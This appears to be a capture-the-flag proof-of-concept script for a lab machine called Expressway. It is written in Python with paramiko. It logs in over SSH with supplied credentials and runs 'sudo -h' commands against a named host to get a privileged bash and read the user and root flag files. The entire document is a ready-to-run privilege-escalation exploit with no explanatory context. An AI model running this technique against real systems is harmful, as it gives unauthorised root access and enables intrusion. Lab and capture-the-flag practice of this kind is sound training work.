import paramiko
import os
import argparse

parser = argparse.ArgumentParser(description="EXPRESSWAY Machine PoC ")
parser.add_argument('-ip', help="Target IP", required=True)
parser.add_argument('-user', help="Enter the Username", required=True)
parser.add_argument('-passwd', help="Enter the Password", required=True)
args = parser.parse_args()



print("[+] Starting script..")

def execute_command(ssh, command):
    try:
        stdin, stdout, stderr = ssh.exec_command(command)
        output = stdout.read().decode()
        error = stderr.read().decode()
        if error:
            print(f"[-] Error: {error}")
        else:
            print(f"[+] ===> {output}")
    except Exception as e:
        print(f"[-] Exception: {str(e)}")

def ssh():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print("[+] Connecting to target")
        ssh.connect(args.ip, username=args.user, password=args.passwd)
        print("[+] Connected")
        commands = [
            f"sudo -h offramp.expressway.htb /bin/bash -p -c 'cat /home/{args.user}/user.txt'",
            "sudo -h offramp.expressway.htb whoami",
            "sudo -h offramp.expressway.htb cat /root/root.txt",
            
        ]
        for cmd in commands:
            execute_command(ssh, cmd)
            
    except paramiko.ssh_exception.AuthenticationException:
        print("[-] Authentication failed")
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("[-] Connection failed")
    except Exception as e:
        print(f"[-] Error: {str(e)}")
    finally:
        ssh.close()
        print("[+] Connection closed")

if __name__ == "__main__":
    ssh()
